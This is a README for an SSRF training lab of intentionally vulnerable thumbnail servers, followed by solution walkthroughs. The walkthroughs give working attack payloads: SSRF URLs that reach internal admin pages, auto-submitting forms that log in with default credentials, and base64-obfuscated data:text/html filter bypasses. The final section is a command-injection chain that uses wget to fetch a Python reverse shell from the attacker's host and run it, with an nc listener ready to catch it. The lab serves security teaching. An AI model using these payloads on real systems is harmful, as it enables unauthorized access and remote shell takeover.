# SSRF World

Exploring SSRFs and what the impact can be

* Enumerate the internal network
* Attack another host
* Attack underlying libraries that exist for the purpose of the server-side request (i.e. thumbnailing)
* Attack the server's browser to get a shell

# Modes and Goals for Training
The different directories will allow an attacker to run the SSRF demo in different modes.

## Solutions
Each directory contains a "solutions.txt" file, which contains simple solutions and explanations.

## Lessons
These environments are designed to teach different lessons to the attacker.
The `thumbnail-server` will teach about basic SSRFs and how they can be used.
This has a built-in "admin" page, with weak credentials.

The `niave mitigation thumbnail server` will teach simple bypasses for an attacker to work on.
The mitigation here is to now allow an attacker to directly request a thumbnail from an internal server.
The goal of this is to encourage an attacker to elevate their perspective and go from
using the SSRF as its own point of attack for enumation, but to leverage JS from external resources.

The `allow-list mitigation thumbnail server` will teach an attacker how they can use protocol
formats, and insecure validation routines to bypass allow-list mitigations.
The mitigation here is to only allow thumbnails of allowed domains. 
This scenario makes it more difficult to leverage an external server, though not impossible.

The `thumbnail server with resizer` will teach an attacker how they can use an SSRF
vulnerability to attack another machine, and compromise weaknesses found within that
to further expand persistence and severity of compromise.

# Basic Usage:
## Running the simple thumbnailer application:

    cd thumbnail-server ; sudo docker build -t ssrf . && sudo docker run --rm -t ssrf

## Running the thumbnail server with niave mitigations:

    cd thumbnail-server-with-niave-remediation ; sudo docker build -t ssrf-niave . && sudo docker run --rm -t ssrf-niave

## Running the thumbnail server with allow-list mitigations:

    cd thumbnail-server-with-allowlist-remediation ; sudo docker build -t ssrf-allowlist . && sudo docker run --rm -t ssrf-allowlist

## Running the thumbnail server with resizer

   cd thumbnail-with-resize ; docker-compose up --build

# Questions
If you have any questions, please reachout to bolton.timothy.j@gmail.com, for further help.

# Walkthroughs for Solutions
For ease, we will call the various thumbnail servers `thumbnail`, and refer to their pages
as a typical site: `http://thumbnail:5000`.

The resizing server will have the same notation, but with the name `resizer`: `http://resizer`

## Accessing Internal Pages
Accessing internal pages from the SSRF can be leveraged with a directory busting utility.
In our case, we can find the admin page by visiting: 

    http://thumbnail:5000/?l?http:%2f%2flocalhost:5000%2fadmin

The only thing you may find yourself getting tripped up with is URL encoding forward slashes.

## Making Post Requests to Sites
Having the server's browser make POST requests to sites can be done with either JS execution
or calling out to server you control, and executing JS there, probably with a form.

### POSTing from a Server You Control
This call goes to a page you have control over, and from it, you can have JS make the form request.

    http://thumbnail:5000/?l?http:%2f%2f192.168.1.11:9999%2fadmin

page.html:

    <!doctype html>
    <html>
        <body>
            <form id=form method=post action=http://thumbnail:5000/admin>
                <input value=admin name=username type=hidden>
                <input value=admin name=password type=hidden>
            </form>
            <script>
                document.getElementById('form').submit();
            </script>
        </body>
    </html>

When this payload is issued, it will make an authentication attempt against the `thumbnail` server's
admin area, and should successfully authenticate, giving us a pciture of "Access Granted" with a silly flag.

### POSTing with data:text/html, Notation
This is a little sneakier, and something I rediscovered in the course of testing.  The data:text/html stream
allows for an attacker to have JS execute in a browser without making an external call at all.

In our case, we want to still POST against the Admin area, so we craft some JS to write a form to the page, and call it.

    http://thumbnail:5000/?l=data:text%2Fhtml%2C%20%3Cscript%3Edocument.write(%27%3Cform%20id%3Dform%20method%3Dpost%20action%3D%22http%3A%2F%2Flocalhost%3a5000%2Fadmin%22%3E%3Cinput%20type%3Dhidden%20value%3Dadmin%20name%3Dusername%3E%3Cinput%20type%3Dhidden%20name%3Dpassword%20value%3Dadmin%3E%3C%2Fform%3E%27)%3Bdocument.getElementById(%27form%27).submit()%3B%3C%2Fscript%3E

It isn't pretty, but it does get the job done.

## Bypassing Simple Filtering of the Requested Endpoint
Here's a contrived example of filtering code that doesn't fully mitigate what it intends to.

The code is meant to make sure that the protocol can be whatever it needs to be, and is split
by the `://` substring.  When this is encountered, it takes what comes after, and then splits again
to grab up to the first `/`.

The attacker can leverage the `data:text/html,` bypass again, and add a inert domain at the end of their payload
to still attack, have the server execute the request, and detonate the payload.

    http://thumbnail:5000/?l=data%3Atext%2Fhtml%2C%20%3Cscript%3Eeval(atob(%22ZG9jdW1lbnQud3JpdGUoJzxmb3JtIGlkPWZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSJodHRwOi8vbG9jYWxob3N0OjUwMDAvYWRtaW4iPjxpbnB1dCB0eXBlPWhpZGRlbiB2YWx1ZT1hZG1pbiBuYW1lPXVzZXJuYW1lPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXBhc3N3b3JkIHZhbHVlPWFkbWluPjwvZm9ybT4nKTtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9ybScpLnN1Ym1pdCgpOw%3D%3D%22));%3C%2Fscript%3Ehttps%3A%2F%2Fgoogle.com

URL encoding can still bite you though.
    
## Bypassing Allow-list Filtering
Here's a situation where the same payload should bypass another mitigatino attempt.
This time the developers are using a list of only allowed domains that can be thumbnailed.

It has a further constraint that we need to force the portion of the payload being tested to 
be in the allow-list. This information could be gathered from looking at what options/examples
of the service already exist.
     
This solution also allows for an attacker be able to use Js that they control even if they 
can't connect to an external server that they have influence / control of.

    http://thumbnail:5000/?l=data%3Atext%2Fhtml%2C%20%3Cscript%3Eeval(atob(%22ZG9jdW1lbnQud3JpdGUoJzxmb3JtIGlkPWZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSJodHRwOi8vbG9jYWxob3N0OjUwMDAvYWRtaW4iPjxpbnB1dCB0eXBlPWhpZGRlbiB2YWx1ZT1hZG1pbiBuYW1lPXVzZXJuYW1lPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXBhc3N3b3JkIHZhbHVlPWFkbWluPjwvZm9ybT4nKTtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9ybScpLnN1Ym1pdCgpOw%3D%3D%22));%3C%2Fscript%3Ehttps%3A%2F%2Fgoogle.com

## Attacking a Secondary Machine
With the final implementation we have, we have added a "resizer" to the mix.  This is 
a dangerously implemented imagemagick server that's literally going to put on the command line
what the thumbnail server sends to it.  It is expecting a base64 encoded string.

With some fancy footwork, we can use our old tricks, and have the server send a malicious
payload that will download a python script to send a reverse shell back to the attacker.

That being said, this one is a bit more complex to solve, but not inaccessible.

The attacker can use an attacking server, which will receive the reverse shell,
as well as host some ancillary files.
Namely, the first JS file, which can be used to call the reverse shell.

Note: the reverse shell was taken from gtfobins: https://gtfobins.github.io/gtfobins/python/#reverse-shell


To set this up, have your listener open on port 4444 on your endpoint set up to receive your shell.

    nc -nlvp 4444

Next, set up a simple HTTP server, to serve your files:

    python -m http.server 9999


The payload will reuse the simple `data:text/html,` stream we have leveraged previously.
It will make a `script` element, with a src attribute set to our HTTP server's attack.js

    data:text/html,<script src="http://192.168.1.11:9999/attack.js"></script>

Since this is in the URL, we'll encode it:

    data:text%2fhtml,<script%20src="http://192.168.1.11:9999/attack.js"><%2fscript>

And once we have that, we can deploy it:

    http://192.168.1.26:5000/?l=data:text%2fhtml,%3Cscript%20src=%22http://192.168.1.11:9999/attack.js%22%3E%3C%2fscript%3E

attacker.js

    document.write("</script><form id=form action='http://resizer:4000' method=post><input name=b64_image value=\"' ; wget http://192.168.1.11:9999/shell.py; python shell.py ; touch resized-img.b64 # \"></form><script>");
    document.getElementById('form').submit();


shell.py

    import sys,socket,os,pty;s=socket.socket()
    s.connect(("192.168.1.11",4444))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/bash")
    

